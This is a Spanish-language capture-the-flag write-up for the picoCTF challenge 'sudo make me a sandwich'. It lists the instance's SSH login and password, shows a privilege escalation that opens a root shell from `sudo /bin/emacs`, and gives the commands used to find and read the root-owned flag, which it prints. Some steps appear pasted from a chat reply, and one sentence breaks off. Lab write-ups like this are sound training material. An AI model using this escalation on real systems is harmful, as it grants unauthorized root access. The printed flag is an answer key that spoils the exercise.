**Área:** Miscelanea **Dificultad:** Medio **Plataforma:** picoCTF  (vía CyLab Academy) **Link del reto o Nombre:** sudo make me a sandwich **Resuelto por:** Axel **Fecha:** 13/09 **Tiempo que tardé:** ~25 min

---
## ¿Qué pista/detalle me hizo saber por dónde ir?

El ejercicio ya me daba esto ¿Puedes leer la bandera? ¡Creo que puedes!  
`ssh -p 54988 ctf-player@green-hill.picoctf.net`usando contraseña `f7e73aca` practicamente te esta diciendo que lo ejecutes en tu terminal de linux  despues hacer los siguientes pasos:
1. Mira qué permisos de sudo tienes:

```
sudo -l
```

Esto te dirá qué comandos puedes ejecutar como root sin contraseña (o con ella).

2. Si ves que puedes ejecutar algo con `sudo` sin restricciones (por ejemplo `sudo cat`, `sudo vi`, `sudo /bin/bash`, o un script específico), úsalo para leer la flag. La flag normalmente está en algún lugar como:
Perfecto, ya tienes la clave: puedes ejecutar `/bin/emacs` como root sin contraseña. Eso te permite sacar una shell de root desde dentro de emacs (técnica clásica de GTFOBins).

Primero reconéctate (se cortó la conexión):

```
ssh -p 54988 ctf-player@green-hill.picoctf.net
```

Luego, una vez dentro, ejecuta:

```
sudo /bin/emacs
```

Dentro de emacs, abre el prompt de ejecución de comandos con:

```
Esc + x
```

Y escribe:

```
shell
```

y presiona Enter. Esto te abrirá una terminal/shell **dentro de emacs, pero corriendo como root**.

Ahí ya puedes hacer:

```
whoami
```

para confirmar que eres root, y luego:

```
cat /root/flag.txt
```

Si no está en esa ruta exacta, prueba:

```
find / -iname "*flag*" 2>/dev/null
```

ya ahi abres el archivo flag.txt y te muestra la flag
## Herramienta(s) que usé

Practicamente solo la terminal de linux y comandos claves

## Pasos (solo lo esencial, tipo lista)

- La instancia ya te daba una gran parte del ejercicio
- luego con la serie de pasos que deje arriba se llega ala flag 
## Comando(s) o payload clave (si aplica)

## Flag

picoCTF{ju57_5ud0_17_9418380d}

## ¿Que aprendí / qué usaría de nuevo?

## ¿Me trabé en algo? ¿Cómo lo destrabé?
